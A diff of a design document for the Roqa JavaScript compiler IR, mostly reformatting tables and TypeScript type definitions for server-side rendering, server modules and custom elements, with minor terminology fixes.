-    "path": ["getItem"]
+  "kind": "external-ref",
+  "name": "localStorage",
+  "path": ["getItem"]
 }
 ```
 
@@ -2373,9 +2376,9 @@ element tag names — no special interop layer needed.
 The IR is designed to work within the existing JavaScript build ecosystem:
 
 - **Vite** — the primary integration point (via the Roqa Vite plugin)
-- **Other bundlers** — the `compile()` function accepts MIR and returns JS
+- **Other bundlers** — the `compile()` function accepts IR and returns JS
   strings, making it embeddable in any build tool's transform pipeline
-- **Pre-compiled IR** — `.roqa-ir.json` files can be consumed directly,
+- **Pre-compiled IR** — `.roqa` files can be consumed directly,
   enabling frontend-agnostic workflows where the IR is generated by one tool
   and compiled by another
 
@@ -2394,20 +2397,20 @@ changes what JavaScript the backend emits, it belongs in the IR. If it's
 purely a runtime concern (orchestrating components, managing navigation), it
 lives above the IR as a library or framework layer.
 
-| Concern | In the IR? | Rationale |
-| --- | --- | --- |
-| Component rendering | ✅ Yes | Core purpose of the IR |
-| Reactive state | ✅ Yes | Directly affects codegen (cells, bindings) |
-| Event handling | ✅ Yes | Affects codegen (delegation, handlers) |
-| Conditional/list rendering | ✅ Yes | Affects codegen (showBlock, forBlock) |
-| Server-side rendering (SSR) | ✅ Partially | Affects codegen (hydration markers, serialization) |
-| Server functions | ✅ Partially | Affects codegen (client/server boundary split) |
-| Data fetching | ⚠️ Maybe | Could inform codegen (suspense, loading states) |
-| Routing | ❌ No | Runtime concern — library above the IR |
-| Form validation | ❌ No | Runtime concern — library above the IR |
-| Component library (design system) | ❌ No | Composition of primitives, not a new primitive |
-| Authentication | ❌ No | Application-level concern |
-| State management (global) | ⚠️ Maybe | Could extend the cell system |
+| Concern                           | In the IR?   | Rationale                                          |
+| --------------------------------- | ------------ | -------------------------------------------------- |
+| Component rendering               | ✅ Yes       | Core purpose of the IR                             |
+| Reactive state                    | ✅ Yes       | Directly affects codegen (cells, bindings)         |
+| Event handling                    | ✅ Yes       | Affects codegen (delegation, handlers)             |
+| Conditional/list rendering        | ✅ Yes       | Affects codegen (showBlock, forBlock)              |
+| Server-side rendering (SSR)       | ✅ Partially | Affects codegen (hydration markers, serialization) |
+| Server functions                  | ✅ Partially | Affects codegen (client/server boundary split)     |
+| Data fetching                     | ⚠️ Maybe     | Could inform codegen (suspense, loading states)    |
+| Routing                           | ❌ No        | Runtime concern — library above the IR             |
+| Form validation                   | ❌ No        | Runtime concern — library above the IR             |
+| Component library (design system) | ❌ No        | Composition of primitives, not a new primitive     |
+| Authentication                    | ❌ No        | Application-level concern                          |
+| State management (global)         | ⚠️ Maybe     | Could extend the cell system                       |
 
 ### How to extend the IR for new primitives
 
@@ -2428,6 +2431,7 @@ required fields would be), frontends get clear errors.
 ### SSR and hydration (future)
 
 SSR requires the backend to generate two outputs from the same MIR:
+
 - **Server output** — renders the component to an HTML string
 - **Client output** — hydrates the existing DOM instead of creating it
 
@@ -2441,13 +2445,14 @@ This affects the IR in two ways:
    HTML so the client can rehydrate without re-fetching data.
 
 These could be modeled as:
+
 ```ts
 type ComponentIR = {
-    // ...existing fields...
-    ssr?: {
-        mode: "full" | "partial" | "islands";
-        serializedState?: string[];  // Which state properties to serialize
-    };
+  // ...existing fields...
+  ssr?: {
+    mode: "full" | "partial" | "islands";
+    serializedState?: string[]; // Which state properties to serialize
+  };
 };
 ```
 
@@ -2468,29 +2473,30 @@ across N action declarations:
 
 ```ts
 type ServerModuleIR = {
-    kind: "server-module";
-    exports: ServerExportIR[];    // Functions / values the client may import
-    body: ExprIR;                 // Server-side initialization (runs once per request)
-    imports?: ImportIR[];         // Imports available only on the server side
-                                  //   (e.g. database drivers)
+  kind: "server-module";
+  exports: ServerExportIR[]; // Functions / values the client may import
+  body: ExprIR; // Server-side initialization (runs once per request)
+  imports?: ImportIR[]; // Imports available only on the server side
+  //   (e.g. database drivers)
 };
 
 type ServerExportIR = {
-    name: string;                 // Exported binding name
-    params: string[];             // RPC parameter names
-    body: ExprIR;                 // Server-side function body
-    async?: boolean;
+  name: string; // Exported binding name
+  params: string[]; // RPC parameter names
+  body: ExprIR; // Server-side function body
+  async?: boolean;
 };
 
 // On the ComponentIR:
 type ComponentIR = {
-    // ...existing fields...
-    serverModule?: ServerModuleIR;
+  // ...existing fields...
+  serverModule?: ServerModuleIR;
 };
 ```
 
 When implemented, a frontend will emit `ComponentIR.serverModule` for any
 `module server { ... }`-style declaration. Each `ServerExportIR` becomes:
+
 - **Server output**: a regular function registered with the RPC dispatcher.
 - **Client output**: a stub that serializes args, calls the dispatcher, and
   awaits the result.
@@ -2524,6 +2530,7 @@ component markup is rendered as direct children of the custom element. Shadow
 DOM is not supported in v1.
 
 Future versions may add Shadow DOM support, which would enable:
+
 - Style encapsulation via shadow roots
 - `<slot>` elements for content projection (a `SlotIR` node in the MIR)
 - Adopted stylesheets scoped to the component
